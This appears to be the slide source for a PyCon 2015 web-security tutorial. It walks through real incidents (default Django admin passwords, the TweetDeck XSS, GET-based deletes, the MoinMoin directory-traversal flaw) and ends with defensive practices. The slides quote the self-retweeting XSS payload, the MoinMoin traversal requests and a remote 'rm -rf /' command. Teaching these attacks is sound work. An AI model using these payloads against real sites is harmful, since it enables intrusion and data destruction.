
# Get comfy with web security

### PyCon 2015

### Jacky Chang, Asheesh Laroia, Nicole Zuckerman

---

# How to turn your computer into a server

## A PyCon talk by Asheesh Laroia & Karen Rustad, 2014

Note:
- So last year at PyCon, a friend and I gave a talk about how to turn a computer into a home server.
- We talked about TCP ports...
- ...and interfaces...
- ...and port forwarding, so you can run a server on your home machine but see it on the Internet.
- So at some point during the talk, I had the wise idea of mapping an app from my laptop to the broader Internet for people to play with.
- I found Nate Aune's version of the Django polls tutorial, and loaded it up.
- At this point, I said, people should start voting! Which is better -- Chewbacca or Caffeine?
- But then I noticed there was a new entry in the list, labeled lol.
- (20:32 is when I got pwned, for screencap purposes.)
- Here's what happened

---
## http://pycon.ngrok.com/

Note:

This was the URL to the site... and within just the 30 seconds of how long it had been up there, my poll had new values.

That was weird because it wasn't like the poll had a "Add new option" element in the UI.

So I'm standing there at the lectern, wondering what happened, and then I quickly realize.

---

<img src="http://www.mit.edu/~asheesh/sec-talk/basic-polls-app.png">

Note:

The Django admin site was enabled, and whatever default users and passwords Nate had used, that's what I was using, too.

So then it was crystal clear. My "friend" Luke Faraone must have decided to go to the admin site and change the poll to increase the lulz factor of the talk.

---

<img src="http://www.mit.edu/~asheesh/sec-talk/polls-app-page-3.png">

---

<img src="http://www.mit.edu/~asheesh/sec-talk/pwned.png">

---

<img src="http://www.mit.edu/~asheesh/sec-talk/pwned-2.png">

---

<img src="http://www.mit.edu/~asheesh/sec-talk/github-polls-app.png">


---

<img src="http://www.mit.edu/~asheesh/sec-talk/github-polls-app-password.png">

Note:
* Default passwords
* Components with known vulnerabilities
- As we go through the other examples in this lulz section, you'll see different security issues that affected different sites. To help you keep track of them, Jacky and Nicole and I made a notes page (which we'll give to you at the end of the first hour) which reminds you of the specific attacks that each worked against each example.
- So feel free to focus on being entertained, as we go through the rest of these examples, but remember that there is a test at the end -- you're going to actually have to use these attacks against some sample sites.

---

# Introduction

### Who we are

Note:

- My background
- Talk about high school sec pwn
- I work at Sandstorm
- Have been a security engineer at Eventbrite
- Jacky works at Eventbrite
- Nicole works at Sosh


---

# Table of contents

- 30 min lecture: Fun attacks
- 15 min exercise: Google Dorking
- 15 min exercise: What are we trying to protect?
- 90 min (+ break): Lab time
- 30 min: Wrap-up, w/ best practices

Note:

- As you hopefully all know, this session is a three hour tutorial.
- The point of the first hour is getting you into a security mindset.
- We'll start that with a half hour lecture about different web security topics and attack strategies. We'll cover cross-site scripting, cross-site request forgery, that sort of thing. It's what you might call textbook web application security, but rather than just talk about how the attacks work, we'll show you specific examples of web apps that were attacked, starting with one of my own.
- The next fifteen minutes, we'll do some exploring of other people's websites through a trick called Google Dorking.
- After that, we'll break into small groups and ask each other what we're trying to protect.
- Hopefully, by then, you'll be thinking like a security engineer. That's good, because after that, we'll spend two hours breaking into some web applications that we put together for this session.
- 

---

# About you

Note:

- Most of you in the room, I don't know you, so I thought I'd try to get a sense of what people's background and interests are.
- Can I get three people to volunteer to talk about why you picked this tutorial to attend?
- Also, there was a different security tutorial yesterday -- were any of you there? If so, great!
- OK! Hopefully this will be fun. Jacky, Nicole, and I definitely want feedback on how the tutorial is, so we'll give you a link to a feedback form at the end.
- The PyCon tutorial organizers also want you to give feedback.
- So with that, we'll begin talking about these attacks.
---

# TweetDeck

<img src="https://g.twimg.com/about/products/tweetdeck/modal/modal1.jpg">

Note:

- So, last June.

`---

<img src="http://i.guim.co.uk/static/w-700/h--/q-95/sys-images/Guardian/Pix/pictures/2014/6/12/1402572144093/a46e0094-c865-47ea-b987-26bb9f3afaa9-620x372.png">

---

<img src="http://i.guim.co.uk/static/w-700/h--/q-95/sys-images/Guardian/Pix/pictures/2014/6/12/1402572144093/a46e0094-c865-47ea-b987-26bb9f3afaa9-620x372.png">

Ob das wohl funktioniert: <strong>Test</strong> <img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">

---

<blockquote class="twitter-tweet" lang="en"><p>&lt;script class=&quot;xss&quot;&gt;
$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click(); 
$(&#39;[data-action=retweet]&#39;).click();
<br>alert(&#39;XSS in Tweetdeck&#39;)&lt;/script&gt;<img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;"></p>&mdash; *arrrrndy (@derGeruhn) <a href="https://twitter.com/derGeruhn/status/476764918763749376">June 11, 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

---

<blockquote class="twitter-tweet" lang="en"><p>We&#39;ve temporarily taken TweetDeck services down to assess today&#39;s earlier security issue. We&#39;ll update when services are back up.</p>&mdash; TweetDeck (@TweetDeck) <a href="https://twitter.com/TweetDeck/status/476770732987252736">June 11, 2014</a></blockquote>

---

<blockquote class="twitter-tweet" lang="en"><p>&lt;script class=&quot;xss&quot;&gt;
$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click(); 
$(&#39;[data-action=retweet]&#39;).click();
<br>alert(&#39;XSS in Tweetdeck&#39;)&lt;/script&gt;<img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;"></p>&mdash; *arrrrndy (@derGeruhn) <a href="https://twitter.com/derGeruhn/status/476764918763749376">June 11, 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

---

&lt;script class="xss">


alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">
---

&lt;script>


alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">
---

&lt;script class="xss">

$('[data-action=retweet]').click();

alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">
---

&lt;script class="xss">

$('.xss').parents().eq(1).find('a').eq(1).click();

$('[data-action=retweet]').click();

alert('XSS in Tweetdeck');

&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">

---

<img src="http://zdnet1.cbsistatic.com/hub/i/r/2014/10/02/b1ac71c2-49e6-11e4-b6a0-d4ae52e95e57/resize/770x578/66b184f0ae55a656be043dd2e4e8361a/tweetdeck-hacked.png">


Note:
- Cross site scripting
- Ask attendees what _further_ damage the JS could have done.

---

# The dangers of GET

---

<img src="http://vivadl.com/wp-content/uploads/2011/01/2008528850143052.jpg">

---

<img src="http://www.indirvip.com/wp-content/uploads/2013/08/Google-Web-Accelerator-Resimleri2.png">

---

<img src="https://signalvnoise.com/images/newbp-users.png">

---

GET /user/1/delete

<img src="https://signalvnoise.com/images/newbp-users.png">

---

GET /user/1/delete

<img src="https://signalvnoise.com/images/newbp-users.png">

building-block for cross-site request forgery

---

# MoinMoin

---

<img src="http://twiki.org/p/pub/Plugins/TWikiDrawPlugin/screenshot.png">

---

* GET /?action=twikidraw&do=modify&target=image.tar
* => Response: file_auth_ticket
    * e.g. fe3321bcda

---

* GET /?action=twikidraw&do=modify&target=image.tar
* => Response: file_auth_ticket
    * e.g. fe3321bcda

then

* POST /?action=twikidraw&do=save&ticket=file_auth_ticket
* &target=image.tar
---

* GET /?action=twikidraw&do=modify
* &target=../../../plugin/action/moinexec.py

then

* POST /?action=twikidraw&do=save&ticket=file_auth_ticket
* &target=../../../plugin/action/moinexec.py

---

GET /?action=moinexec&c=**whatever**

---

GET /?action=moinexec&c=rm%20-rf%20/

---

# Impact

* wiki.python.org & wiki.debian.org
* polyglot file + dir traversal =>
    * remote code execution

---

## Summary

* Security misconfiguration (default password)
---

## Summary

* Security misconfiguration (default password)
* Cross-site request forgery (GET to delete)
---

## Summary

* Security misconfiguration (default password)
* Cross-site request forgery (GET to delete)
* Cross-site scripting (TweetDeck)
---

## Summary

* Security misconfiguration (default password)
* Cross-site request forgery (GET to delete)
* Cross-site scripting (TweetDeck)
* Code injection (MoinMoin bug)
---

## What's next

* 15 minutes of Google Dorking
* Think (5m), Pair (5m), Share (5m)
* http://www.exploit-db.com/google-dorks/

---

# Google Dorking results

What did people find?

---

# What is at risk -- for you?

Small group discussion. Consider:

* Your servers
* Your users' information privacy
* Your users' account security
* Money

---

# Wrap-up

* Discuss each vulnerability
* Lecture: advanced variants
* Questions!
* Thanks!

---

## Cross-site scripting

* Theory: Escape content in a context-appropriate way
* Practice: Get good tools & trust 'em.
    * Template auto-escaping.

---

## Default passwords

---

## Authorization checking

* `@login_required ` not enough
* `Model.objects.filter(user=request.user)`

---

## Authorization checking

* `@login_required ` not enough
* `Model.objects.filter(user=request.user)`
* `Model.objects.for_user(request.user)`

---

## Secure by default

* Keep security simple.
---

## Secure by default

* Keep security simple.
* Principle of least authority.

---

## Cross-site request forgery

* POST to change data, and

---

## Cross-site request forgery

* POST to change data, and
* Django: `{%  csrf_token %}`

---

## Session data stealing

* Keep secrets secret.
* Don't use pickle.

---

## SQL injection

* Don't use raw SQL.
* Use an ORM (sqlalchemy, Django ORM).
* Use "prepared queries".

---

```
query(
    "SELECT * from user where ID=%d" % (1,)
)
```

vs

```
query(
    "SELECT * from user where ID=?",
    1
)
```
---

## Testing

```
# Positive assertions
assert(response.status_code, 200)
```

---

## Testing

```
# Positive assertions
assert(response.status_code, 200)

# Negative assertions
assert(response.status_code, 404)
```

---

## Vulnerable dependencies

* Libraries run with full privilege.
* FIXME where did the attack stuff go?

---

## Extra attacks

* Cookies
    * `httponly`
    * `secure`
* Subdomains + cookies
* XSS via file upload

---

## Resources

* _Great book_: The Tangled Web by Michael Zalewski
* Open Web App Security Project, e.g. Top 10
* Django security docs
* `security-announce` email lists everywhere

---

## Thanks

All the following people helped with this tutorial:

* Jacky Chang
* Nicole Zuckerman
* Drew Fisher
* Asheesh Laroia
* Karen Rustad
